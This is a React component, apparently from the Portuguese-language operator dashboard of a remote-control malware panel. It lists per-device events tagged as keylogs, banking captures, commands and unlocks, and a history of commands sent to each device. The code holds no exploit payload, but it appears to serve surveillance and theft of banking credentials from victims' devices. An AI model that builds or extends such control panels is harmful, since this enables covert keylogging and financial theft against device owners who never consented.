import { useEffect, useState } from 'react';
import useStore from '../../store/index.js';

function ts(t) { return t ? new Date(t).toLocaleTimeString() : ''; }

export default function Logs() {
  const selectedId = useStore(s => s.selectedId);
  const events     = useStore(s => s.events);
  const [cmds, setCmds]   = useState([]);
  const [tab, setTab]     = useState('events');
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (tab === 'cmds' && selectedId) loadCmds();
  }, [tab, selectedId]);

  async function loadCmds() {
    setLoading(true);
    try {
      const r = await fetch(`/api/devices/${selectedId}/commands?limit=100`);
      setCmds(await r.json());
    } catch (_) {} finally { setLoading(false); }
  }

  return (
    <div className="fade-up">
      <div className="section-title mb12">
        <span className="section-icon">📋</span>Logs
      </div>

      <div className="row gap6 mb12">
        <button className={`btn btn-sm ${tab === 'events' ? 'btn-gold' : 'btn-ghost'}`} onClick={() => setTab('events')}>
          Eventos ({events.length})
        </button>
        <button className={`btn btn-sm ${tab === 'cmds' ? 'btn-gold' : 'btn-ghost'}`} onClick={() => setTab('cmds')}>
          Comandos
        </button>
      </div>

      {tab === 'events' && (
        <div className="term" style={{ height: 500, overflowY: 'auto' }}>
          {events.length === 0 && <div style={{ color: 'var(--text3)', textAlign: 'center', paddingTop: 20 }}>Sem eventos</div>}
          {events.map((ev, i) => (
            <div key={i} className="log-line">
              <span className="log-ts">{ts(ev.ts)}</span>
              <span className={`log-text ${
                ev.type === 'keylog'  ? 'log-keylog'  :
                ev.type === 'bank'    ? 'log-bank'    :
                ev.type === 'cmd'     ? 'log-cmd'     :
                ev.type === 'unlock'  ? 'log-unlock'  : ''
              }`}>{ev.text}</span>
            </div>
          ))}
        </div>
      )}

      {tab === 'cmds' && (
        <>
          <div className="row-sb mb8">
            <span className="txt-xs txt-dim">{cmds.length} comandos</span>
            <button className="btn btn-ghost btn-xs" onClick={loadCmds}>↺</button>
          </div>
          {loading && <div className="row" style={{ justifyContent: 'center', padding: 20 }}><div className="spin" /></div>}
          {!loading && cmds.length === 0 && <div className="no-data">Nenhum comando</div>}
          {!loading && (
            <div style={{ maxHeight: 480, overflowY: 'auto' }}>
              {cmds.map((c, i) => (
                <div key={i} className="card card-sm mb6"
                  style={{ borderLeftWidth: 3, borderLeftStyle: 'solid', borderLeftColor: c.sent ? '#00c864' : '#e03060' }}>
                  <div className="row-sb mb4">
                    <span className="txt-sm bold txt-gold">{c.action}</span>
                    <div className="row gap6">
                      <span className={`pill ${c.sent ? 'pill-green' : 'pill-red'}`} style={{ fontSize: 9 }}>
                        {c.sent ? 'SENT' : 'OFFLINE'}
                      </span>
                      <span className="txt-xs txt-dim">{ts(c.ts)}</span>
                    </div>
                  </div>
                  {c.params && c.params !== '{}' && (
                    <div className="txt-xs txt-mono txt-dim" style={{ wordBreak: 'break-all' }}>
                      {c.params.slice(0, 120)}
                    </div>
                  )}
                </div>
              ))}
            </div>
          )}
        </>
      )}

      <div style={{ height: 20 }} />
    </div>
  );
}
